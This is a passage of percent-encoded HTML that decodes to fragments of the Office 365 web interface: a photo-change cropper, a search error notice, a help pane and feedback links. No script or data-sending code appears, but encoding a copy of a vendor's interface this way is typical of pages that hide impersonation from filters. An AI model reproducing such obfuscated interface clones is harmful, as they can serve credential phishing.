%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%61%72%64%73%2D%63%61%72%64%20%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%63%6F%6C%6C%61%70%73%65%64%20%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%6C%6F%61%64%69%6E%67%20%77%66%2D%73%69%7A%65%2D%78%31%34%20%6D%73%2D%62%63%6C%2D%6E%6C%22%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%73%70%69%6E%6E%65%72%22%3E%3C%2F%64%69%76%3E%20%3C%73%70%61%6E%3E%4C%6F%61%64%69%6E%67%2E%2E%2E%3C%2F%73%70%61%6E%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%61%72%64%73%2D%63%61%72%64%20%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%63%6F%6C%6C%61%70%73%65%64%20%77%66%2D%73%69%7A%65%2D%78%31%34%20%6D%73%2D%62%63%6C%2D%6E%6C%22%3E%20%3C%73%70%61%6E%3E%53%6F%72%72%79%2C%20%74%68%65%72%65%27%73%20%61%20%70%72%6F%62%6C%65%6D%20%77%69%74%68%20%73%65%61%72%63%68%20%72%69%67%68%74%20%6E%6F%77%2E%20%50%6C%65%61%73%65%20%74%72%79%20%61%67%61%69%6E%20%6C%61%74%65%72%2E%3C%2F%73%70%61%6E%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%61%72%64%73%2D%63%61%72%64%20%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%63%6F%6C%6C%61%70%73%65%64%20%77%66%2D%73%69%7A%65%2D%78%31%34%20%6D%73%2D%62%63%6C%2D%6E%6C%22%3E%20%3C%73%70%61%6E%3E%57%61%6E%74%20%74%6F%20%63%68%61%6E%67%65%20%61%20%73%65%74%74%69%6E%67%3F%20%57%68%65%6E%20%79%6F%75%27%72%65%20%6F%6E%20%74%68%65%20%73%65%74%74%69%6E%67%73%20%70%61%67%65%2C%20%79%6F%75%20%63%61%6E%20%6D%61%6B%65%20%79%6F%75%72%20%75%70%64%61%74%65%73%20%74%68%65%72%65%2E%3C%2F%73%70%61%6E%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%72%6F%6C%65%3D%22%72%65%67%69%6F%6E%22%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%70%61%6E%65%2D%73%65%74%74%69%6E%67%73%2D%73%65%63%74%69%6F%6E%20%6F%33%36%35%63%73%2D%66%6C%65%78%70%61%6E%65%2D%73%65%74%74%69%6E%67%73%2D%74%69%74%6C%65%20%6F%33%36%35%63%73%2D%6C%69%67%68%74%46%6F%6E%74%20%6D%73%2D%66%63%6C%2D%6E%70%20%77%66%2D%73%69%7A%65%2D%78%32%38%22%3E%20%3C%73%70%61%6E%3E%43%68%61%6E%67%65%20%79%6F%75%72%20%70%68%6F%74%6F%3C%2F%73%70%61%6E%3E%20%3C%2F%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%70%61%6E%65%2D%73%65%74%74%69%6E%67%73%20%6F%33%36%35%63%73%2D%66%6C%65%78%70%61%6E%65%2D%76%69%65%77%20%6F%33%36%35%63%73%2D%63%61%72%64%73%22%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%6C%65%78%70%61%6E%65%2D%73%65%74%74%69%6E%67%73%2D%63%6F%6E%74%61%69%6E%65%72%20%6D%73%2D%62%63%6C%2D%6E%6C%22%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%61%72%64%73%2D%63%61%72%64%20%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%63%6F%6C%6C%61%70%73%65%64%20%77%66%2D%73%69%7A%65%2D%78%31%34%22%3E%20%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%61%72%64%73%2D%73%65%63%74%69%6F%6E%2D%62%75%73%79%22%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%61%72%64%73%2D%73%65%63%74%69%6F%6E%2D%62%75%73%79%43%6F%6E%74%65%6E%74%22%3E%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%73%70%69%6E%6E%65%72%22%3E%3C%2F%73%70%61%6E%3E%20%3C%73%70%61%6E%3E%3C%2F%73%70%61%6E%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%20%3C%64%69%76%3E%20%3C%61%20%74%69%74%6C%65%3D%22%43%68%6F%6F%73%65%20%61%20%70%68%6F%74%6F%22%20%68%72%65%66%3D%22%23%22%20%74%61%62%69%6E%64%65%78%3D%22%30%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%6F%6E%74%2D%73%20%6D%73%2D%66%63%6C%2D%74%70%20%77%66%2D%73%69%7A%65%2D%78%31%32%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%74%70%20%6F%77%61%69%6D%67%20%6D%73%2D%49%63%6F%6E%2D%2D%66%6F%6C%64%65%72%20%6D%73%2D%69%63%6F%6E%2D%66%6F%6E%74%2D%73%69%7A%65%2D%32%32%22%3E%20%3C%2F%73%70%61%6E%3E%3C%73%70%61%6E%3E%43%68%6F%6F%73%65%20%61%20%70%68%6F%74%6F%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%20%3C%64%69%76%20%72%6F%6C%65%3D%22%74%65%78%74%62%6F%78%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%70%2D%68%69%64%64%65%6E%69%6E%70%75%74%22%3E%3C%69%6E%70%75%74%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%70%2D%68%69%64%64%65%6E%69%6E%70%75%74%22%20%61%63%63%65%70%74%3D%22%69%6D%61%67%65%2F%2A%22%20%74%61%62%69%6E%64%65%78%3D%22%2D%31%22%20%69%64%3D%22%5F%66%69%6C%65%49%6E%70%75%74%22%20%74%79%70%65%3D%22%66%69%6C%65%22%3E%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%70%2D%63%72%6F%70%70%65%72%63%6F%6E%74%72%6F%6C%73%22%3E%20%3C%61%20%74%69%74%6C%65%3D%22%52%6F%74%61%74%65%20%72%69%67%68%74%22%20%68%72%65%66%3D%22%23%22%20%74%61%62%69%6E%64%65%78%3D%22%30%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%6F%6E%74%2D%73%20%77%66%2D%73%69%7A%65%2D%78%31%32%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%6E%73%20%6F%77%61%69%6D%67%20%6D%73%2D%49%63%6F%6E%2D%2D%72%65%6C%6F%61%64%20%6D%73%2D%69%63%6F%6E%2D%66%6F%6E%74%2D%73%69%7A%65%2D%32%32%22%3E%20%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%20%3C%61%20%74%69%74%6C%65%3D%22%44%65%6C%65%74%65%22%20%68%72%65%66%3D%22%23%22%20%74%61%62%69%6E%64%65%78%3D%22%30%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%6F%6E%74%2D%73%20%77%66%2D%73%69%7A%65%2D%78%31%32%20%6F%33%36%35%63%73%2D%66%6C%6F%61%74%2D%72%69%67%68%74%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%6E%73%20%6F%77%61%69%6D%67%20%6D%73%2D%49%63%6F%6E%2D%2D%74%72%61%73%68%20%6D%73%2D%69%63%6F%6E%2D%66%6F%6E%74%2D%73%69%7A%65%2D%32%32%22%3E%20%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%3E%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%70%2D%64%6F%75%67%68%62%6F%79%2D%69%63%6F%6E%20%6D%73%2D%62%67%63%2D%6E%74%20%6D%73%2D%66%63%6C%2D%77%20%6F%77%61%69%6D%67%20%6D%73%2D%49%63%6F%6E%2D%2D%70%65%72%73%6F%6E%20%6D%73%2D%69%63%6F%6E%2D%66%6F%6E%74%2D%73%69%7A%65%2D%35%32%22%3E%20%3C%2F%73%70%61%6E%3E%20%3C%69%6D%67%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%70%2D%63%75%72%72%65%6E%74%70%68%6F%74%6F%22%3E%20%3C%63%61%6E%76%61%73%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%77%69%64%74%68%3D%22%32%35%36%22%20%68%65%69%67%68%74%3D%22%32%35%36%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%66%70%2D%63%72%6F%70%70%65%72%22%3E%3C%2F%63%61%6E%76%61%73%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%3E%20%3C%61%20%74%69%74%6C%65%3D%22%5A%6F%6F%6D%20%69%6E%22%20%68%72%65%66%3D%22%23%22%20%74%61%62%69%6E%64%65%78%3D%22%30%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%6F%6E%74%2D%73%20%77%66%2D%73%69%7A%65%2D%78%31%32%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%6E%73%20%6F%77%61%69%6D%67%20%6D%73%2D%49%63%6F%6E%2D%2D%70%6C%75%73%20%6D%73%2D%69%63%6F%6E%2D%66%6F%6E%74%2D%73%69%7A%65%2D%32%32%22%3E%20%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%20%3C%61%20%74%69%74%6C%65%3D%22%5A%6F%6F%6D%20%6F%75%74%22%20%68%72%65%66%3D%22%23%22%20%74%61%62%69%6E%64%65%78%3D%22%30%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%6F%6E%74%2D%73%20%77%66%2D%73%69%7A%65%2D%78%31%32%20%6F%33%36%35%63%73%2D%66%6C%6F%61%74%2D%72%69%67%68%74%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%6E%73%20%6F%77%61%69%6D%67%20%6D%73%2D%49%63%6F%6E%2D%2D%6D%69%6E%75%73%20%6D%73%2D%69%63%6F%6E%2D%74%61%6C%6C%2D%67%6C%79%70%68%20%6D%73%2D%69%63%6F%6E%2D%66%6F%6E%74%2D%73%69%7A%65%2D%32%32%22%3E%20%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%61%72%64%73%2D%73%65%63%74%69%6F%6E%2D%73%61%76%65%22%3E%20%3C%61%20%61%72%69%61%2D%6C%61%62%65%6C%6C%65%64%62%79%3D%22%5F%61%72%69%61%49%64%5F%32%22%20%68%72%65%66%3D%22%23%22%20%74%61%62%69%6E%64%65%78%3D%22%30%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%6F%6E%74%2D%73%20%77%66%2D%73%69%7A%65%2D%78%31%32%20%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%62%75%74%74%6F%6E%20%6F%33%36%35%62%75%74%74%6F%6E%20%6D%73%2D%62%67%63%2D%74%73%20%6D%73%2D%62%63%6C%2D%6E%74%20%6D%73%2D%66%63%6C%2D%77%22%3E%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%5F%66%63%5F%33%20%6F%77%61%69%6D%67%22%3E%20%3C%2F%73%70%61%6E%3E%3C%73%70%61%6E%20%69%64%3D%22%5F%61%72%69%61%49%64%5F%32%22%20%63%6C%61%73%73%3D%22%5F%66%63%5F%34%20%6F%33%36%35%62%75%74%74%6F%6E%4C%61%62%65%6C%22%3E%53%61%76%65%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%20%3C%61%20%61%72%69%61%2D%6C%61%62%65%6C%6C%65%64%62%79%3D%22%5F%61%72%69%61%49%64%5F%31%22%20%68%72%65%66%3D%22%23%22%20%74%61%62%69%6E%64%65%78%3D%22%30%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%6F%6E%74%2D%73%20%77%66%2D%73%69%7A%65%2D%78%31%32%20%6F%33%36%35%63%73%2D%73%65%74%74%69%6E%67%73%2D%62%75%74%74%6F%6E%20%6F%33%36%35%62%75%74%74%6F%6E%20%6D%73%2D%62%67%63%2D%6E%6C%72%20%6D%73%2D%62%63%6C%2D%6E%74%20%6D%73%2D%66%63%6C%2D%6E%70%22%3E%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%5F%66%63%5F%33%20%6F%77%61%69%6D%67%22%3E%20%3C%2F%73%70%61%6E%3E%3C%73%70%61%6E%20%69%64%3D%22%5F%61%72%69%61%49%64%5F%31%22%20%63%6C%61%73%73%3D%22%5F%66%63%5F%34%20%6F%33%36%35%62%75%74%74%6F%6E%4C%61%62%65%6C%22%3E%43%61%6E%63%65%6C%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%61%72%64%73%2D%65%72%72%6F%72%22%3E%20%3C%73%70%61%6E%3E%3C%2F%73%70%61%6E%3E%20%3C%2F%64%69%76%3E%20%3C%61%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%68%72%65%66%3D%22%23%22%20%74%61%62%69%6E%64%65%78%3D%22%30%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%6F%6E%74%2D%73%20%6D%73%2D%66%63%6C%2D%74%70%20%77%66%2D%73%69%7A%65%2D%78%31%32%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%2F%61%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%2D%66%6C%65%78%50%61%6E%65%2D%66%75%6C%6C%44%69%76%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%72%6F%6C%65%3D%22%72%65%67%69%6F%6E%22%3E%3C%64%69%76%20%72%6F%6C%65%3D%22%72%65%67%69%6F%6E%22%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%66%64%20%6F%33%36%35%63%73%2D%6E%66%64%2D%6E%6F%72%6D%61%6C%2D%66%6F%6E%74%73%69%7A%65%22%3E%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6C%69%67%68%74%46%6F%6E%74%20%6F%33%36%35%2D%68%65%6C%70%2D%66%6C%65%78%2D%70%61%6E%65%2D%6C%61%62%65%6C%22%3E%48%65%6C%70%3C%2F%73%70%61%6E%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%22%20%72%6F%6C%65%3D%22%74%65%78%74%62%6F%78%22%20%63%6C%61%73%73%3D%22%61%6C%6C%6F%77%54%65%78%74%53%65%6C%65%63%74%69%6F%6E%20%6D%73%2D%66%63%6C%2D%6E%73%20%74%65%78%74%62%6F%78%20%6D%73%2D%66%6F%6E%74%2D%73%20%6D%73%2D%66%77%74%2D%73%6C%20%6D%73%2D%66%63%6C%2D%6E%70%20%6D%73%2D%62%63%6C%2D%6E%74%61%20%6D%73%2D%62%63%6C%2D%6E%73%61%2D%68%20%6F%33%36%35%2D%73%65%61%72%63%68%2D%63%6F%6E%74%72%6F%6C%22%3E%3C%62%75%74%74%6F%6E%20%61%72%69%61%2D%6C%61%62%65%6C%3D%22%41%63%74%69%76%61%74%65%20%53%65%61%72%63%68%20%54%65%78%74%62%6F%78%22%20%69%64%3D%22%4F%33%36%35%5F%53%65%61%72%63%68%5F%42%75%74%74%6F%6E%22%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%2D%73%65%61%72%63%68%2D%62%6F%78%20%6F%33%36%35%62%75%74%74%6F%6E%20%6D%73%2D%62%67%63%2D%74%6C%72%22%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%2D%73%65%61%72%63%68%2D%69%63%6F%6E%20%6F%33%36%35%2D%73%65%61%72%63%68%2D%69%63%6F%6E%2D%72%69%67%68%74%20%6F%77%61%69%6D%67%20%6D%73%2D%49%63%6F%6E%2D%2D%6C%69%67%68%74%42%75%6C%62%32%20%6D%73%2D%69%63%6F%6E%2D%66%6F%6E%74%2D%73%69%7A%65%2D%31%37%20%6D%73%2D%66%63%6C%2D%74%70%22%3E%20%3C%2F%73%70%61%6E%3E%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%2D%73%65%61%72%63%68%2D%70%6C%61%63%65%68%6F%6C%64%65%72%20%6F%33%36%35%63%73%2D%73%65%6D%69%4C%69%67%68%74%46%6F%6E%74%20%6D%73%2D%66%63%6C%2D%6E%73%22%3E%54%65%6C%6C%20%6D%65%20%77%68%61%74%20%79%6F%75%20%77%61%6E%74%20%74%6F%20%64%6F%3C%2F%73%70%61%6E%3E%3C%2F%62%75%74%74%6F%6E%3E%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%2D%73%65%61%72%63%68%2D%62%6F%78%20%6D%73%2D%62%67%63%2D%74%6C%72%22%3E%3C%2F%64%69%76%3E%3C%2F%64%69%76%3E%20%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%3C%2F%64%69%76%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%66%64%2D%63%6F%6E%74%65%6E%74%22%3E%20%20%3C%64%69%76%3E%20%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%61%75%74%6F%69%64%3D%22%5F%5F%4D%69%63%72%6F%73%6F%66%74%5F%4F%33%36%35%5F%53%68%65%6C%6C%47%32%5F%50%6C%75%73%5F%74%65%6D%70%6C%61%74%65%73%5F%63%73%5F%43%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%6E%70%20%6F%33%36%35%63%73%2D%73%65%6D%69%4C%69%67%68%74%46%6F%6E%74%20%6F%33%36%35%63%73%2D%6E%66%64%2D%6C%61%62%65%6C%20%6F%33%36%35%63%73%2D%6E%66%64%2D%74%69%74%6C%65%22%3E%57%68%61%74%27%73%20%6E%65%77%3C%2F%73%70%61%6E%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%6E%66%64%2D%66%6C%69%73%74%20%6F%33%36%35%63%73%2D%73%65%67%6F%65%52%65%67%75%6C%61%72%20%6D%73%2D%62%63%6C%2D%6E%6C%22%3E%3C%2F%64%69%76%3E%20%3C%62%75%74%74%6F%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%61%75%74%6F%69%64%3D%22%5F%5F%4D%69%63%72%6F%73%6F%66%74%5F%4F%33%36%35%5F%53%68%65%6C%6C%47%32%5F%50%6C%75%73%5F%74%65%6D%70%6C%61%74%65%73%5F%63%73%5F%44%22%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%74%70%20%6F%33%36%35%63%73%2D%6E%66%64%2D%66%69%74%65%6D%20%6F%33%36%35%63%73%2D%6E%66%64%2D%65%78%70%61%6E%64%20%6F%33%36%35%63%73%2D%6E%66%64%2D%66%6F%20%6D%73%2D%62%67%63%2D%6E%6C%2D%68%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%2F%62%75%74%74%6F%6E%3E%20%3C%2F%64%69%76%3E%20%20%3C%64%69%76%3E%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%3E%20%3C%73%70%61%6E%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%75%73%74%6F%6D%73%75%70%70%6F%72%74%2D%74%69%74%6C%65%20%6F%33%36%35%63%73%2D%73%65%6D%69%4C%69%67%68%74%46%6F%6E%74%22%3E%3C%2F%73%70%61%6E%3E%20%3C%64%69%76%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%75%73%74%6F%6D%73%75%70%70%6F%72%74%22%3E%20%3C%62%75%74%74%6F%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%75%73%74%6F%6D%73%75%70%70%6F%72%74%2D%65%6E%74%72%79%20%6D%73%2D%66%63%6C%2D%74%70%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%2F%62%75%74%74%6F%6E%3E%20%3C%62%75%74%74%6F%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%75%73%74%6F%6D%73%75%70%70%6F%72%74%2D%65%6E%74%72%79%20%6D%73%2D%66%63%6C%2D%74%70%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%2F%62%75%74%74%6F%6E%3E%20%3C%62%75%74%74%6F%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%74%79%70%65%3D%22%62%75%74%74%6F%6E%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%63%75%73%74%6F%6D%73%75%70%70%6F%72%74%2D%65%6E%74%72%79%20%6D%73%2D%66%63%6C%2D%74%70%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%2F%62%75%74%74%6F%6E%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%3C%2F%64%69%76%3E%20%20%3C%64%69%76%20%73%74%79%6C%65%3D%22%22%20%63%6C%61%73%73%3D%22%6F%33%36%35%63%73%2D%74%65%78%74%2D%61%6C%69%67%6E%2D%6C%65%66%74%22%3E%3C%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%74%70%20%6F%33%36%35%63%73%2D%6E%66%64%2D%6E%6F%72%6D%61%6C%2D%6C%69%6E%65%68%65%69%67%68%74%22%3E%3C%61%20%61%72%69%61%2D%6C%61%62%65%6C%6C%65%64%62%79%3D%22%5F%61%72%69%61%49%64%5F%38%22%20%69%64%3D%22%4F%33%36%35%5F%53%75%62%4C%69%6E%6B%5F%53%68%65%6C%6C%46%65%65%64%62%61%63%6B%22%20%74%61%72%67%65%74%3D%22%5F%62%6C%61%6E%6B%22%20%68%72%65%66%3D%22%68%74%74%70%73%3A%2F%2F%70%6F%72%74%61%6C%2E%6F%66%66%69%63%65%2E%63%6F%6D%2F%53%65%6E%64%53%6D%69%6C%65%3F%77%69%64%3D%31%30%22%20%73%74%79%6C%65%3D%22%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%74%70%20%6F%33%36%35%63%73%2D%6E%66%64%2D%6E%6F%72%6D%61%6C%2D%66%6F%6E%74%73%69%7A%65%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%5F%66%63%5F%33%20%6F%77%61%69%6D%67%22%3E%20%3C%2F%73%70%61%6E%3E%3C%73%70%61%6E%20%69%64%3D%22%5F%61%72%69%61%49%64%5F%38%22%20%63%6C%61%73%73%3D%22%5F%66%63%5F%34%20%6F%33%36%35%62%75%74%74%6F%6E%4C%61%62%65%6C%22%3E%46%65%65%64%62%61%63%6B%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%74%70%20%6F%33%36%35%63%73%2D%6E%66%64%2D%6E%6F%72%6D%61%6C%2D%6C%69%6E%65%68%65%69%67%68%74%22%3E%3C%61%20%61%72%69%61%2D%6C%61%62%65%6C%6C%65%64%62%79%3D%22%5F%61%72%69%61%49%64%5F%39%22%20%69%64%3D%22%4F%33%36%35%5F%53%75%62%4C%69%6E%6B%5F%53%68%65%6C%6C%43%6F%6D%6D%75%6E%69%74%79%22%20%74%61%72%67%65%74%3D%22%5F%62%6C%61%6E%6B%22%20%68%72%65%66%3D%22%68%74%74%70%73%3A%2F%2F%67%2E%6D%69%63%72%6F%73%6F%66%74%6F%6E%6C%69%6E%65%2E%63%6F%6D%2F%30%42%58%32%30%65%6E%2F%31%34%32%22%20%73%74%79%6C%65%3D%22%22%20%72%6F%6C%65%3D%22%6C%69%6E%6B%22%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%74%70%20%6F%33%36%35%63%73%2D%6E%66%64%2D%6E%6F%72%6D%61%6C%2D%66%6F%6E%74%73%69%7A%65%20%6F%33%36%35%62%75%74%74%6F%6E%22%3E%3C%73%70%61%6E%20%73%74%79%6C%65%3D%22%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%22%20%63%6C%61%73%73%3D%22%5F%66%63%5F%33%20%6F%77%61%69%6D%67%22%3E%20%3C%2F%73%70%61%6E%3E%3C%73%70%61%6E%20%69%64%3D%22%5F%61%72%69%61%49%64%5F%39%22%20%63%6C%61%73%73%3D%22%5F%66%63%5F%34%20%6F%33%36%35%62%75%74%74%6F%6E%4C%61%62%65%6C%22%3E%43%6F%6D%6D%75%6E%69%74%79%3C%2F%73%70%61%6E%3E%3C%2F%61%3E%3C%2F%64%69%76%3E%3C%64%69%76%20%63%6C%61%73%73%3D%22%6D%73%2D%66%63%6C%2D%74%70%20%6F%33%36%35%63%73%2D%6E%66%64%2D%6E%6F%72%6D%61%6C%2D%6C%69%6E%65%68%65%69%67%68%74%22%3E%3C%61%20%61%72%69%61%2D%6C%61%62%65%6C%6C%65%64%62%79%3D%22%5F%61%72%69%61%49%64%5F%31%30%22%20%69%64%3D%22%4F%33%36%35%5F%53%75%62%4C%69%6E%6B%5F%53%